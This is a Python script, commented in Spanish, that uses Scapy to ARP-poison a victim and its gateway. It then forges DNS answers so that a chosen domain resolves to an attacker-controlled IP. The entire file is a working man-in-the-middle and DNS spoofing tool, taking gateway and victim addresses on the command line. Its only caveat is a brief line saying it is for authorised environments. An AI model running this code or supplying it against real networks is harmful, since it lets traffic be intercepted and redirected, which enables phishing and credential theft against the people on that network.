from scapy.all import *
import sys
import time
import threading

from scapy.layers.dns import DNS, DNSRR
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether, ARP
"""
Este script realiza dos acciones principales:

Utiliza ARP poisoning para situarse en el medio entre la víctima y su gateway predeterminado.
Supervisa el tráfico DNS y falsifica respuestas para un dominio específico.

Para ejecutar este script (solo en entornos autorizados):

sudo python3 dns_spoof.py <IP_del_gateway> <IP_de_la_victima>

"""
# Dominio objetivo y dirección IP falsa
DOMINIO_OBJETIVO = "example.com"
IP_FALSA = "192.168.1.100"  # Esta sería la IP del atacante o un servidor controlado


def dns_spoofer(pkt):
    if (DNS in pkt and pkt[DNS].qr == 0 and
            DOMINIO_OBJETIVO in pkt[DNS].qd.qname.decode('utf-8')):
        # Obtenemos los datos del paquete original
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)

        # Creamos la respuesta DNS falsificada
        dns = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,  # Authoritative Answer
            qr=1,  # Este es una respuesta
            qdcount=1,
            ancount=1,
            an=DNSRR(
                rrname=pkt[DNS].qd.qname,
                ttl=3600,
                type='A',
                rclass='IN',
                rdata=IP_FALSA
            )
        )

        # Construimos y enviamos el paquete falsificado
        pkt_falso = ip / udp / dns
        send(pkt_falso, verbose=0)
        print(f"[+] Consulta DNS detectada para {DOMINIO_OBJETIVO}")
        print(f"[+] Respuesta falsificada enviada: {DOMINIO_OBJETIVO} -> {IP_FALSA}")


def arp_poisoner(gateway_ip, gateway_mac, target_ip, target_mac):
    print(f"[*] Iniciando ARP poisoning entre {target_ip} y {gateway_ip}")
    try:
        while True:
            # Envía ARP a la víctima (el gateway es el atacante)
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
            # Envía ARP al gateway (la víctima es el atacante)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Deteniendo ARP poisoning")
        # Restaurar ARP tables
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac), count=5, verbose=0)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac), count=5, verbose=0)


def get_mac(ip):
    resp, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=10, verbose=0)
    for s, r in resp:
        return r[Ether].src
    return None


def main():
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <IP_gateway> <IP_objetivo>")
        sys.exit(1)

    gateway_ip = sys.argv[1]
    target_ip = sys.argv[2]

    # Obtenemos las direcciones MAC
    print("[*] Obteniendo direcciones MAC...")
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)

    if gateway_mac is None or target_mac is None:
        print("[!] No se pudieron obtener las direcciones MAC. Saliendo.")
        sys.exit(1)

    print(f"[*] Gateway: {gateway_ip} -> {gateway_mac}")
    print(f"[*] Objetivo: {target_ip} -> {target_mac}")

    # Iniciamos el ARP poisoning en un hilo separado
    t = threading.Thread(target=arp_poisoner, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    t.daemon = True
    t.start()

    # Configuramos el sniffer de DNS
    print("[*] Iniciando sniffer de DNS...")
    try:
        sniff(filter="udp port 53", prn=dns_spoofer)
    except KeyboardInterrupt:
        print("[*] Deteniendo ataque...")
        sys.exit(0)


if __name__ == "__main__":
    main()